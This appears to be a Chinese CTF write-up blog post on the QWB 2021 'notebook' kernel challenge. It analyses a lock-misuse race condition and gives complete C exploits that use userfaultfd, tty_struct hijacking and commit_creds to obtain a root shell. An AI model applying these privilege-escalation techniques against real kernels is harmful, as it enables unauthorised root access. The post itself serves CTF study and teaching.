---
title: 「Kernel Pwn」从强网杯 2021 notebook 理解 RaceCondition 做法
description: 我是 Kernel Pwn 新手
pubDate: 2024-10-31
authors:
- nova
---

我是 Kernel Pwn 新手

附件 GitHub 随便搜 qwb2021 就有

<!--truncate-->

## 分析

### noteadd

![image-20241031142916722](https://oss.nova.gal/img/image-20241031142916722.png)

显然有一个非常奇怪的逻辑：在拿到 size 之后，它首先设置了 notebook[idx].size，如果不合法再把它设置回来，那么不难想到，如果我们有一个地方根据这个 size 来做一些逻辑，那么我们就有竞争的窗口，或者说把一个不合法的 size 修改为合法的。



有人可能会说：这不是上锁了吗？确实。但是谁在写操作里上读锁啊？显然只要没有写锁被 hold 的话，持有读锁的线程都可以并发访问这个临界区资源。



### notedel

![image-20241031143209266](https://oss.nova.gal/img/image-20241031143209266.png)

同样奇怪的逻辑。只有在 size 域存在的时候才会清空 v3->note。那么显然如果 del 的时候这个 note size 域为 0 就不会清空它。但是他拿的是写锁，所以不能和 add 联动造 uaf



### noteedit

![image-20241031143856161](https://oss.nova.gal/img/image-20241031143856161.png)

对于 edit，它拿的也是读锁，并且会调用 krealloc。如果 v5->size 是 0，那么就会清理 note 字段。值得注意的是，这里没有对 size 域的限制。



如果我们的某个线程 krealloc(0)，然后卡在 copy_from_user 处，其实就造了一个 UAF 出来。只不过，由于他接下来还需要检测 size 段，所以我们还需要把它改回去。如果继续用 edit，那么没办法卡 copy_from_user，因为此时已经重新分配了。

如果说我们卡另一个 realloc 原本大小，那么这个竞争窗口又太小了，因为我们必须保证 `size = v5->size` 的时候它还是原本的 size，然后在执行后面 `if (size == newsize)` 的时候我们另一个线程已经完成了 `realloc(0)` 并且在等待 copy_from_user。

因此，其实我们可以使用 noteadd，因为它先修改大小，然后再接受 copy_from_user，此时我们可以人为控制这个窗口。当卡在 realloc(0) 的 copy_from_user 时，我们进行 add，然后等到跑到 noteadd 的 copy_from_user 时我们再继续接下来的攻击，这样就有了一个可靠的竞争利用。

### notegift

![image-20241031144057570](C:\Users\nova\AppData\Roaming\Typora\typora-user-images\image-20241031144057570.png)

直接把 notebook 给我们了，那堆地址啥的也有了。



### mynote_read

![image-20241031144311861](https://oss.nova.gal/img/image-20241031144311861.png)

读，没有锁



### mynote_write

![image-20241031144354846](https://oss.nova.gal/img/image-20241031144354846.png)

写，也没锁。



## 思路

### 1、userfaultfd + tty_struct

显然用 userfaultfd 是最容易达成 UAF 的，因为我们可以把 copy_from_user 传数据的那个页搞成 Anouymous 的，然后第一次访问就会造成缺页异常，进而进入到我们自己的 handler 里。



因此我们可以用 tty_struct 来泄露内核地址，并且能够通过伪造 tty_operations 来进行提权。在 write 操作的时候 rax 寄存器是 tty_struct 的地址，因此我们可以在这个上面布置 ROP 链子，从而将栈迁移到我们的 notebook 上，从而完成提权。



为了达成我们 raceCondition 的顺序，我们可以使用信号量来做。

我们添加一个 chunk，然后 edit 它的大小为 0，此时 copy_from_user 触发缺页异常，我们激活 add，然后让他修改 size，接着继续触发缺页异常。



```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/syscall.h>

#define DEBUG 1
#include "kernel.h"


sem_t add_sem, edit_sem;

struct Note {
    size_t idx;
    size_t size;
    void *content;
};

struct KNote {
    void* ptr;
    size_t size;
};

struct KNote notes[0x10];

pthread_t monitor_thread, add_thread, edit_thread;
char *uffd_buf;



int fd;

void add(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x100, &note);
}

void delete(int idx) {
    struct Note note;
    note.idx = idx;
    ioctl(fd, 0x200, &note);
}

void edit(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x300, &note);
}

void gift(void *buf) {
    struct Note note = {
        .content = buf
    };
    ioctl(fd, 100, &note);
}

void note_read(int idx, void *buf) {
    read(fd, buf, idx);
}

void note_write(int idx, void *buf) {
    write(fd, buf, idx);
}

void stuck() {
    puts("[+] Stuck");
    sleep(100000);
}

void add_thread_func() {
    sem_wait(&add_sem);
    add(0, 0x20, uffd_buf);
}

void edit_thread_func() {
    sem_wait(&edit_sem);
    edit(0, 0, uffd_buf);
}

int main() {
    int tty_fd;
    size_t tty_buf[0x100];
    save_status();
    bind_cpu(0);


    fd = open("/dev/notebook", O_RDWR);
    if (fd < 0) {
        perror("open fd");
        exit(EXIT_FAILURE);
    }
    sem_init(&add_sem, 0, 0);
    sem_init(&edit_sem, 0, 0);

    uffd_buf = (char *) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd_with_default_handler(&monitor_thread, uffd_buf, 0x1000, stuck);

    add(0, 0x20, "add");
    edit(0, 0x2e0, "tty");

    pthread_create(&add_thread, NULL, (void *)add_thread_func, NULL);
    pthread_create(&edit_thread, NULL, (void *)edit_thread_func, NULL);

    sem_post(&edit_sem);
    sleep(1);
    sem_post(&add_sem);
    sleep(1);

    puts("[+] UAF");  // 0->ptr = freed_chunk

    tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    note_read(0, tty_buf);
    kernel_base = tty_buf[3] - 0xe8e440;
    printf("[+] kernel_base = 0x%lx\n", kernel_base);
}

```



在这里，我们用了两个信号量来做，这样的话方便控制一些，对于缺页的页只需要 stuck 就完事了。有了 UAF 之后，我们可以简单的使用 write 来进行提权。



后面的东西我们不再介绍，gift 拿到 heap 之后伪造 tty_operations，然后利用 work_for_cpu_fn 来分布执行拿到 shell 即可

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/syscall.h>

#define DEBUG 1
#include "kernel.h"

size_t WORK_FOR_CPU_FN = 0xffffffff8109eb90;
size_t PREPARE_KERNEL_CRED = 0xffffffff810a9ef0;
size_t COMMIT_CREDS = 0xffffffff810a9b40;

char tmp_buf[0x1000];

sem_t add_sem, edit_sem;

struct Note {
    size_t idx;
    size_t size;
    void *content;
};

struct KNote {
    void* ptr;
    size_t size;
};

struct KNote notes[0x10];

pthread_t monitor_thread, add_thread, edit_thread;
char *uffd_buf;



int fd;

void add(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x100, &note);
}

void delete(int idx) {
    struct Note note;
    note.idx = idx;
    ioctl(fd, 0x200, &note);
}

void edit(int idx, int size, char *content) {
    struct Note note;
    note.idx = idx;
    note.size = size;
    note.content = content;

    ioctl(fd, 0x300, &note);
}

void gift(void *buf) {
    struct Note note = {
        .content = buf
    };
    ioctl(fd, 100, &note);
}

void note_read(int idx, void *buf) {
    read(fd, buf, idx);
}

void note_write(int idx, void *buf) {
    write(fd, buf, idx);
}

void stuck() {
    puts("[+] Stuck");
    sleep(100000);  // stuck to prevent copy_from_user
}

void add_thread_func() {
    sem_wait(&add_sem);
    add(0, 0x60, uffd_buf);
}

void edit_thread_func() {
    sem_wait(&edit_sem);
    edit(0, 0, uffd_buf);
}

int main() {
    int tty_fd;
    size_t tty_buf[0x2e0], orig_tty_buf[0x2e0];
    struct tty_operations fake_tty_ops;
    save_status();
    bind_cpu(0);


    fd = open("/dev/notebook", O_RDWR);
    if (fd < 0) {
        perror("open fd");
        exit(EXIT_FAILURE);
    }
    sem_init(&add_sem, 0, 0);
    sem_init(&edit_sem, 0, 0);

    uffd_buf = (char *) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd_with_default_handler(&monitor_thread, uffd_buf, 0x1000, stuck);

    add(0, 0x20, "add");
    edit(0, 0x2e0, "tty");

    pthread_create(&add_thread, NULL, (void *)add_thread_func, NULL);
    pthread_create(&edit_thread, NULL, (void *)edit_thread_func, NULL);

    sem_post(&edit_sem);
    sleep(1);
    sem_post(&add_sem);
    sleep(1);

    puts("[+] UAF");  // 0->ptr = freed_chunk

    tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    note_read(0, tty_buf);
    memcpy(orig_tty_buf, tty_buf, sizeof(tty_buf));
    kernel_offset = tty_buf[3] - 0xe8e440 - kernel_base;
    kernel_base = kernel_base + kernel_offset;
    printf("[+] kernel_base = 0x%lx\n", kernel_base);

    // fake tty_struct
    add(1, 0x20, "fake tty ops");
    edit(1, sizeof(struct tty_operations), "fake tty ops");

    fake_tty_ops.ioctl = (void *)kernel_offset + WORK_FOR_CPU_FN;
    note_write(1, &fake_tty_ops);

    gift(notes);
    printf("[+] tty_struct = %p\n", notes[0].ptr);
    printf("[+] tty_operations = %p\n", notes[1].ptr);

    tty_buf[4] = kernel_offset + PREPARE_KERNEL_CRED;
    tty_buf[5] = 0;
    tty_buf[3] = (size_t)notes[1].ptr;
    note_write(0, tty_buf);

    ioctl(tty_fd, 1, 1);

    note_read(0, tty_buf);
    tty_buf[4] = kernel_offset + COMMIT_CREDS;
    tty_buf[5] = tty_buf[6];

    note_write(0, tty_buf);
    ioctl(tty_fd, 1, 1);

    note_write(0, orig_tty_buf);

    get_root_shell();
}

```
